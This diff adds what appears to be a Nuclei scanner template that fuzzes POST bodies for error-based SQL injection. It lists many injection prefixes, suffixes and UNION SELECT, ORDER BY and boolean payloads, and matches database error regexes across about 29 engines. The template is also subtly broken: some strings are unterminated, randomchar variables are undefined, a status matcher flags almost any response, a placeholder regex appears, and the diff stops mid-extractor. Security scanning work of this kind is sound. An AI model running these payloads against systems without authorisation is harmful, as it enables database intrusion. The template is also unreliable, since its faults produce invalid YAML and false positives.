@@ -1,0 +1,704 @@
+id: error-based-sqli-post-request
+
+info:
+  name: SQL Injection Detection for POST Request
+  author: Userware (U53RW4R3), fopwn (notnci)
+  severity: critical
+  description: |
+    Detects potential SQL injection via error strings in 29 database engines for HTTP POST request.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  reference:
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/boundaries.xml
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/errors.xml
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/error_based.xml
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/union_query.xml
+  tags: sqli,error,dast
+
+http:
+  - filters:
+      - type: dsl
+        dsl:
+          - "method == 'POST'"
+          - "len(body) > 0"
+        condition: and
+
+    variables:
+        randomstr1: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+        randomstr2: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+        randomnum1: {{rand_int(1, 9999)}}
+        randomnum2: {{rand_int(1, 9999)}}
+
+    payloads:
+        prefix:
+            - ""
+            - " "
+            - "' "
+            - "\" "
+            - ") "
+            - ")) "
+            - "))) "
+            - "') "
+            - "')) "
+            - "'))) "
+            - "\") "
+            - "\")) "
+            - "\"))) "
+            - "%'"
+            - " WHERE {{randomnum1}}={{randomnum1}} "
+            - "' WHERE {{randomnum1}}={{randomnum1}} "
+            - "\" WHERE {{randomnum1}}={{randomnum1}} "
+            - "\") WHERE {{randomnum1}}={{randomnum1}} "
+            - "'||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "'||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+            - "'+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+            - "+(SELECT {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "')) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "\")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - ")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "') AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "\") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - ") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "` WHERE {{randomnum1}}={{randomnum1}} "
+            - "`) WHERE {{randomnum1}}={{randomnum1}} "
+            - "]-(SELECT 0 WHERE {{randomnum1}}={{randomnum1}} "
+            - "{{randomstr1}}, "
+        suffix:
+            - ""
+            - " "
+            - "#"
+            - "# {{randomstr1}}"
+            - "--"
+            - "-- {{randomstr1}}"
+            -  "-- \""
+            - "-- ;"
+            - "-- -"
+            - ")+"
+            - ")||'"
+            - ")+'"
+            - "OR '{{randomstr1}}'='{{randomstr2}}
+            - "AND ({{randomnum1}}={{randomnum1}}"
+            - "AND (({{randomnum1}}={{randomnum1}}"
+            - "AND ((({{randomnum1}}={{randomnum1}}"
+            - "AND ('{{randomstr1}}'='{{randomstr1}}"
+            - "AND (('{{randomstr1}}'='{{randomstr1}}"
+            - "AND ((('{{randomstr1}}'='{{randomstr1}}"
+            - "AND '{{randomstr1}}'='{{randomstr1}}"
+            - "AND ('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND (('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND ((('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND '{{randomstr1}}%'='{{randomstr1}}"
+            - "AND '{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND (\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND ((\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND (((\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND \"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND (\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND ((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND (((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND \"{{randomstr1}}\" LIKE \"{{randomstr1}}
+            - "{{randomstr2}}"
+        payload:
+            - "OR {{randomnum1}}={{randomnum1}}"
+            - "OR {{randomnum1}}={{randomnum1}} LIMIT 1"
+            - "OR {{randomnum1}}={{randomnum2}}"
+            - "OR {{randomnum1}}={{randomnum2}} LIMIT 1"
+            - "OR '{{randomchar1}}'='{{randomchar1}}'"
+            - "OR '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+            - "OR '{{randomchar1}}'='{{randomchar2}}'"
+            - "OR '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+            - "AND {{randomnum1}}={{randomnum1}}"
+            - "AND {{randomnum1}}={{randomnum1}} LIMIT 1"
+            - "AND {{randomnum1}}={{randomnum2}}"
+            - "AND {{randomnum1}}={{randomnum2}} LIMIT 1"
+            - "AND '{{randomchar1}}'='{{randomchar1}}'"
+            - "AND '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+            - "AND '{{randomchar1}}'='{{randomchar2}}'"
+            - "AND '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+            - "ORDER BY 100"
+            - "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100"
+            - "GROUP BY 100"
+            - "GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100"
+            - "UNION SELECT 1"
+            - "UNION SELECT 1,2"
+            - "UNION SELECT 1,2,3"
+            - "UNION SELECT 1,2,3,4"
+            - "UNION SELECT 1,2,3,4,5"
+            - "UNION SELECT 1,2,3,4,5,6"
+            - "UNION SELECT 1,2,3,4,5,6,7"
+            - "UNION SELECT 1,2,3,4,5,6,7,8"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
+            - "UNION SELECT NULL"
+            - "UNION SELECT NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT 1"
+            - "UNION ALL SELECT 1,2"
+            - "UNION ALL SELECT 1,2,3"
+            - "UNION ALL SELECT 1,2,3,4"
+            - "UNION ALL SELECT 1,2,3,4,5"
+            - "UNION ALL SELECT 1,2,3,4,5,6"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
+            - "UNION ALL SELECT NULL"
+            - "UNION ALL SELECT NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+
+    attack: clusterbomb
+
+    fuzzing:
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{prefix}}{{payload}}{{suffix}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 302
+          - 200
+      - type: regex
+        regex:
+          - "SQL syntax.*?MySQL"
+          - "Warning.*?\\Wmysqli?_"
+          - "MySQLSyntaxErrorException"
+          - "valid MySQL result"
+          - "check the manual that (corresponds to|fits) your MySQL server version"
+          - "Unknown column '[^ ]+' in 'field list'"
+          - "MySqlClient\\."
+          - "com\\.mysql\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Mysqli_Exception"
+          - "Pdo[./_\\\\]Mysql"
+          - "MySqlException"
+          - "SQLSTATE[\\d+]: Syntax error or access violation"
+          # MariaDB
+          - "check the manual that (corresponds to|fits) your MariaDB server version"
+           # Drizzle
+          - "check the manual that (corresponds to|fits) your Drizzle server version"
+          # MemSQL
+          - "MemSQL does not support this type of query"
+          - "is not supported by MemSQL"
+          - "unsupported nested scalar subselect"
+          # PostgreSQL
+          - "PostgreSQL.*?ERROR"
+          - "Warning.*?\\Wpg_"
+          - "valid PostgreSQL result"
+          - "Npgsql\\."
+          - "PG::SyntaxError:"
+          - "org\\.postgresql\\.util\\.PSQLException"
+          - "ERROR:\\s\\ssyntax error at or near"
+          - "ERROR: parser: parse error at or near"
+          - "PostgreSQL query failed"
+          - "org\\.postgresql\\.jdbc"
+          - "Pdo[./_\\\\]Pgsql"
+          - "PSQLException"
+          # Microsoft SQL Server
+          - "Driver.*? SQL[\\-\\_\\ ]*Server"
+          - "OLE DB.*? SQL Server"
+          - "\\bSQL Server[^&lt;&quot;]+Driver"
+          - "Warning.*?\\W(mssql|sqlsrv)_"
+          - "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}"
+          - "System\\.Data\\.SqlClient\\.SqlException\\.(SqlException|SqlConnection\\.OnError)"
+          - "(?s)Exception.*?\\bRoadhouse\\.Cms\\."
+          - "Microsoft SQL Native Client error '[0-9a-fA-F]{8}"
+          - "\\[SQL Server\\]"
+          - "ODBC SQL Server Driver"
+          - "ODBC Driver \\d+ for SQL Server"
+          - "SQLServer JDBC Driver"
+          - "com\\.jnetdirect\\.jsql"
+          - "macromedia\\.jdbc\\.sqlserver"
+          - "Zend_Db_(Adapter|Statement)_Sqlsrv_Exception"
+          - "com\\.microsoft\\.sqlserver\\.jdbc"
+          - "Pdo[./_\\\\](Mssql|SqlSrv)"
+          - "SQL(Srv|Server)Exception"
+          - "Unclosed quotation mark after the character string"
+          # Microsoft Access
+          - "Microsoft Access (\\d+ )?Driver"
+          - "JET Database Engine"
+          - "Access Database Engine"
+          - "ODBC Microsoft Access"
+          - "Syntax error \\(missing operator\\) in query expression"
+          # Oracle
+          - "\\bORA-\\d{5}"
+          - "Oracle error"
+          - "Oracle.*?Driver"
+          - "Warning.*?\\W(oci|ora)_"
+          - "quoted string not properly terminated"
+          - "SQL command not properly ended"
+          - "macromedia\\.jdbc\\.oracle"
+          - "oracle\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Oracle_Exception"
+          - "Pdo[./_\\\\](Oracle|OCI)"
+          - "OracleException"
+          # IBM DB2
+          - "CLI Driver.*?DB2"
+          - "DB2 SQL error"
+          - "\\bdb2_\\w+\\("
+          - "SQLCODE[=:\\d, -]+SQLSTATE"
+          - "com\\.ibm\\.db2\\.jcc"
+          - "Zend_Db_(Adapter|Statement)_Db2_Exception"
+          - "Pdo[./_\\\\]Ibm"
+          - "DB2Exception"
+          - "ibm_db_dbi\\.ProgrammingError"
+          # Informix
+          - "Warning.*?\\Wifx_"
+          - "Exception.*?Informix"
+          - "Informix ODBC Driver"
+          - "ODBC Informix driver"
+          - "com\\.informix\\.jdbc"
+          - "weblogic\\.jdbc\\.informix"
+          - "Pdo[./_\\\\]Informix"
+          - "IfxException"
+          # Firebird
+          - "Dynamic SQL Error"
+          - "Warning.*?\\Wibase_"
+          - "org\\.firebirdsql\\.jdbc"
+          - "Pdo[./_\\\\]Firebird"
+          # SQLite
+          - "SQLite/JDBCDriver"
+          - "SQLite\\.Exception"
+          - "(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException"
+          - "Warning.*?\\W(sqlite_|SQLite3::)"
+          - "\\[SQLITE_ERROR\\]"
+          - "SQLite error \\d+:"
+          - "sqlite3.OperationalError:"
+          - "SQLite3::SQLException"
+          - "org\\.sqlite\\.JDBC"
+          - "Pdo[./_\\\\]Sqlite"
+          - "SQLiteException"
+          # SAP MaxDB
+          - "SQL error.*?POS([0-9]+)"
+          - "Warning.*?\\Wmaxdb_"
+          - "DriverSapDB"
+          - "-3014.*?Invalid end of SQL statement"
+          - "com\\.sap\\.dbtech\\.jdbc"
+          - "\\[-3008\\].*?: Invalid keyword or missing delimiter"
+          # Sybase
+          - "Warning.*?\\Wsybase_"
+          - "Sybase message"
+          - "Sybase.*?Server message"
+          - "SybSQLException"
+          - "Sybase\\.Data\\.AseClient"
+          - "com\\.sybase\\.jdbc"
+          # Ingres
+          - "Warning.*?\\Wingres_"
+          - "Ingres SQLSTATE"
+          - "Ingres\\W.*?Driver"
+          - "com\\.ingres\\.gcf\\.jdbc"
+          # FrontBase
+          - "Exception (condition )?\\d+\\. Transaction rollback"
+          - "com\\.frontbase\\.jdbc"
+          - "Syntax error 1. Missing"
+          - "(Semantic|Syntax) error [1-4]\\d{2}\\."
+          # HSQLDB
+          - "Unexpected end of command in statement \\["
+          - "Unexpected token.*?in statement \\["
+          - "org\\.hsqldb\\.jdbc"
+          # H2
+          - "org\\.h2\\.jdbc"
+          - "\\[42000-192\\]"
+          # MonetDB
+          - "![0-9]{5}![^\\n]+(failed|unexpected|error|syntax|expected|violation|exception)"
+          - "\\[MonetDB\\]\\[ODBC Driver"
+          - "nl\\.cwi\\.monetdb\\.jdbc"
+          # Apache Derby
+          - "Syntax error: Encountered"
+          - "org\\.apache\\.derby"
+          - "ERROR 42X01"
+          # Vertica
+          - ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):"
+          - "/vertica/Parser/scan"
+          - "com\\.vertica\\.jdbc"
+          - "org\\.jkiss\\.dbeaver\\.ext\\.vertica"
+          - "com\\.vertica\\.dsi\\.dataengine"
+          # Mckoi
+          - "com\\.mckoi\\.JDBCDriver"
+          - "com\\.mckoi\\.database\\.jdbc"
+          - "&lt;REGEX_LITERAL&gt;"
+          # Presto
+          - "com\\.facebook\\.presto\\.jdbc"
+          - "io\\.prestosql\\.jdbc"
+          - "com\\.simba\\.presto\\.jdbc"
+          - "UNION query has different number of fields: \\d+, \\d+"
+          # Altibase
+          - "Altibase\\.jdbc\\.driver"
+          # MimerSQL
+          - "com\\.mimer\\.jdbc"
+          - "Syntax error,[^\\n]+assumed to mean"
+          # CrateDB
+          - "io\\.crate\\.client\\.jdbc"
+          # Cache
+          - "encountered after end of query"
+          - "A comparison operator is required here"
+          # Raima Database Manager
+          - "-10048: Syntax error"
+          - "rdmStmtPrepare\\(.+?\\) returned"
+          # Virtuoso
+          - "SQ074: Line \\d+:"
+          - "SR185: Undefined procedure"
+          - "SQ200: No table "
+          - "Virtuoso S0002 Error"
+          - "\\[(Virtuoso Driver|Virtuoso iODBC Driver)\\]\\[Virtuoso Server\\]"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: MySQL
+        regex:
+          - "SQL syntax.*?MySQL"
+          - "Warning.*?\\Wmysqli?_"
+          - "MySQLSyntaxErrorException"
+          - "valid MySQL result"
+          - "check the manual that (corresponds to|fits) your MySQL server version"
+          - "Unknown column '[^ ]+' in 'field list'"
+          - "MySqlClient\\."
+          - "com\\.mysql\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Mysqli_Exception"
+          - "Pdo[./_\\\\]Mysql"
+          - "MySqlException"
+          - "SQLSTATE[\\d+]: Syntax error or access violation"
+
+      - type: regex
+        name: MariaDB
+        regex:
+          - "check the manual that (corresponds to|fits) your MariaDB server version"
+
+      - type: regex
+        name: Drizzel
+        regex:
+          - "check the manual that (corresponds to|fits) your Drizzle server version"
+
+      - type: regex
+        name: MemSQL
+        regex:
+          - "MemSQL does not support this type of query"
+          - "is not supported by MemSQL"
+          - "unsupported nested scalar subselect"
+
+      - type: regex
+        name: PostgreSQL
+        regex:
+          - "PostgreSQL.*?ERROR"
+          - "Warning.*?\\Wpg_"
+          - "valid PostgreSQL result"
+          - "Npgsql\\."
+          - "PG::SyntaxError:"
+          - "org\\.postgresql\\.util\\.PSQLException"
+          - "ERROR:\\s\\ssyntax error at or near"
+          - "ERROR: parser: parse error at or near"
+          - "PostgreSQL query failed"
+          - "org\\.postgresql\\.jdbc"
+          - "Pdo[./_\\\\]Pgsql"
+          - "PSQLException"
+
+      - type: regex
+        name: MicrosoftSQLServer
+        regex:
+          - "Driver.*? SQL[\\-\\_\\ ]*Server"
+          - "OLE DB.*? SQL Server"
+          - "\\bSQL Server[^&lt;&quot;]+Driver"
+          - "Warning.*?\\W(mssql|sqlsrv)_"
+          - "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}"
+          - "System\\.Data\\.SqlClient\\.SqlException\\.(SqlException|SqlConnection\\.OnError)"
+          - "(?s)Exception.*?\\bRoadhouse\\.Cms\\."
+          - "Microsoft SQL Native Client error '[0-9a-fA-F]{8}"
+          - "\\[SQL Server\\]"
+          - "ODBC SQL Server Driver"
+          - "ODBC Driver \\d+ for SQL Server"
+          - "SQLServer JDBC Driver"
+          - "com\\.jnetdirect\\.jsql"
+          - "macromedia\\.jdbc\\.sqlserver"
+          - "Zend_Db_(Adapter|Statement)_Sqlsrv_Exception"
+          - "com\\.microsoft\\.sqlserver\\.jdbc"
+          - "Pdo[./_\\\\](Mssql|SqlSrv)"
+          - "SQL(Srv|Server)Exception"
+          - "Unclosed quotation mark after the character string"
+
+      - type: regex
+        name: MicrosoftAccess
+        regex:
+          - "Microsoft Access (\\d+ )?Driver"
+          - "JET Database Engine"
+          - "Access Database Engine"
+          - "ODBC Microsoft Access"
+          - "Syntax error \\(missing operator\\) in query expression"
+
+      - type: regex
+        name: Oracle
+        regex:
+          - "\\bORA-\\d{5}"
+          - "Oracle error"
+          - "Oracle.*?Driver"
+          - "Warning.*?\\W(oci|ora)_"
+          - "quoted string not properly terminated"
+          - "SQL command not properly ended"
+          - "macromedia\\.jdbc\\.oracle"
+          - "oracle\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Oracle_Exception"
+          - "Pdo[./_\\\\](Oracle|OCI)"
+          - "OracleException"
+
+      - type: regex
+        name: IBMDB2
+        regex:
+          - "CLI Driver.*?DB2"
+          - "DB2 SQL error"
+          - "\\bdb2_\\w+\\("
+          - "SQLCODE[=:\\d, -]+SQLSTATE"
+          - "com\\.ibm\\.db2\\.jcc"
+          - "Zend_Db_(Adapter|Statement)_Db2_Exception"
+          - "Pdo[./_\\\\]Ibm"
+          - "DB2Exception"
+          - "ibm_db_dbi\\.ProgrammingError"
+
+      - type: regex
+        name: Informix
+        regex:
+          - "Warning.*?\\Wifx_"
+          - "Exception.*?Informix"
+          - "Informix ODBC Driver"
+          - "ODBC Informix driver"
+          - "com\\.informix\\.jdbc"
+          - "weblogic\\.jdbc\\.informix"
+          - "Pdo[./_\\\\]Informix"
+          - "IfxException"
+
+      - type: regex
+        name: Firebird
+        regex:
+          - "Dynamic SQL Error"
+          - "Warning.*?\\Wibase_"
+          - "org\\.firebirdsql\\.jdbc"
+          - "Pdo[./_\\\\]Firebird"
+
+      - type: regex
+        name: SQLite
